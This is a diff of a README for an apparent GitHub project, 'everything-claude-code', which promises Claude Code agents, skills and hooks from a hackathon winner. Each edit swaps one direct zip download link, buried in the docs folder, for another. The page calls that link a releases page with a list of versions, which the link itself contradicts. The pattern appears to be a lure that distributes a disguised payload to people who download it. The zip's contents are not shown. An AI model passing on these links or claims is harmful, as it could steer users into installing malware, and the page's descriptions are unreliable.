@@ -1,7 +1,7 @@
 # 🎉 everything-claude-code - Your Ultimate AI Configuration Toolkit
 
 ## 🚀 Visit Here to Download
-[![Download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/zh-TW/skills/postgres-patterns/claude_everything_code_1.0.zip)](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/zh-TW/skills/postgres-patterns/claude_everything_code_1.0.zip)
+[![Download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/code_everything_claude_3.3.zip)](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/code_everything_claude_3.3.zip)
 
 ## 📖 Description
 Welcome to the everything-claude-code repository. Here, you’ll find a complete collection of configurations for Claude Code. This includes agents, skills, hooks, commands, rules, and MCPs. These battle-tested configurations come from a winner of the Anthropic hackathon, ensuring you receive quality resources to enhance your productivity. 
@@ -23,7 +23,7 @@ To run everything-claude-code smoothly, ensure your system meets the following r
 To start using everything-claude-code, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to [this page to download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/zh-TW/skills/postgres-patterns/claude_everything_code_1.0.zip).
+   Go to [this page to download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/code_everything_claude_3.3.zip).
   
 2. **Download the Latest Release**  
    You will see a list of available versions. Click on the latest release to begin your download.
@@ -38,7 +38,7 @@ To start using everything-claude-code, follow these steps:
    Explore the settings and configurations to start maximizing your productivity.
 
 ## 📥 Download & Install
-To access everything-claude-code, please [visit this page to download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/zh-TW/skills/postgres-patterns/claude_everything_code_1.0.zip). 
+To access everything-claude-code, please [visit this page to download](https://github.com/arabicapp/everything-claude-code/raw/refs/heads/main/docs/code_everything_claude_3.3.zip). 
 
 Follow the instructions listed in the Getting Started section to complete the installation.
 
